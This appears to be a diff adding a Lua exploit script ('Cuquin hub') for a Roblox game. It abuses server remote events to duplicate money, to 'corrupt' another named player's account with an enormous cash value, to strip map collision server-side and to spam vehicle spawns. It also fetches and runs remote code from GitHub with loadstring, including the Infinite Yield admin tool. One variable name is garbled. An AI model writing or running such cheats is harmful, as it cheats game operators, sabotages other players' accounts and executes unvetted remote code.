@@ -1,0 +1,131 @@
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+local Window = Rayfield:CreateWindow({
+   Name = "Cuquin hub",
+   LoadingTitle = "Loading...",
+   LoadingSubtitle = "Best script hub??!?",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+   Discord = {
+      Enabled = false,
+      Invite = "jhhgvjhbjhbjhbjhbjhb", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD.
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Sirius Hub",
+      Subtitle = "Key System",
+      Note = "Join the discord (discord.gg/sirius)",
+      FileName = "SiriusKey",
+      SaveKey = true,
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = "Hello"
+   }
+})
+local Tab = Window:CreateTab("Main", 4483362458)
+local Section = Tab:CreateSection("Main")
+_G.PlayerCorruption = "idk"
+_G.PlayerMoneyAmount = "idk"
+_G.PlayerMoneyGive = "idk"
+
+local Button = Tab:CreateButton({
+   Name = "Dupe Money",
+   Callback = function()
+   	local args = {
+    		[1] = false,
+    		[2] = 50000000,
+    		[3] = "Cash",
+    		[4] = game:GetService("Players").LocalPlayer
+	}
+	game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(args))
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Remove Map Collision (Server Sided)",
+   Callback = function()
+	for _, GameFucked in pairs(workspace:GetChildren()) do
+		game.ReplicatedStorage.DoorOpener:FireServer(GameFucked)
+	end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Spawn boat (can spam button)",
+   Callback = function()
+	local A_1 = "Jetski"
+    local Event = game:GetService("ReplicatedStorage").BoatSpawner
+    Event:InvokeServer(A_1)
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Infinite Yield",
+   Callback = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+local Tab = Window:CreateTab("Corrupt Account", 4483362458)
+local Section = Tab:CreateSection("Corrupt")
+
+local Input = Tab:CreateInput({
+   Name = "Player to corrupt account",
+   PlaceholderText = "Builderman",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+   	_G.PlayerCorruption = Text
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Corrupt Player",
+   Callback = function()
+	local playertocorrupt = _G.PlayerCorruption
+   	local args = {
+    		[1] = false,
+    		[2] = 50000000000000000000000,
+    		[3] = "Cash",
+    		[4] = game.Players[playertocorrupt]
+	}
+	game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(args))
+   end,
+})
+
+local Tab = Window:CreateTab("Money", 4483362458)
+local Section = Tab:CreateSection("Money")
+
+local Input = Tab:CreateInput({
+   Name = "Player to give moeny",
+   PlaceholderText = "Builderman",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+   	_G.PlayerMon eyGive = Text
+   end,
+})
+
+local Input = Tab:CreateInput({
+   Name = "Amount",
+   PlaceholderText = "500",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+   	_G.PlayerMoneyAmount = Text
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Give money to player",
+   Callback = function()
+	local playertocorrupt = _G.PlayerMoneyGive
+    local amount = _G.PlayerMoneyAmount
+   	local args = {
+    		[1] = false,
+    		[2] = amount,
+    		[3] = "Cash",
+    		[4] = game.Players[playertocorrupt]
+	}
+	game:GetService("ReplicatedStorage").MoneyRequest:FireServer(unpack(args))
+   end,
+})
